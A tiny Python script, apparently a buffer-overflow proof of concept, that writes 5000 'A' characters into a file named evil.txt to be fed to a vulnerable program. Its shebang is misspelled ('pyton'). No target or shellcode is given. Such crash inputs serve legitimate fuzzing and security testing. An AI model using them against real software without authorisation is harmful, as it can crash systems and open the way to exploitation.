#!/usr/bin/env pyton


evil="A" * 5000
f=open("evil.txt", "w")
f.write(evil)
f.close()
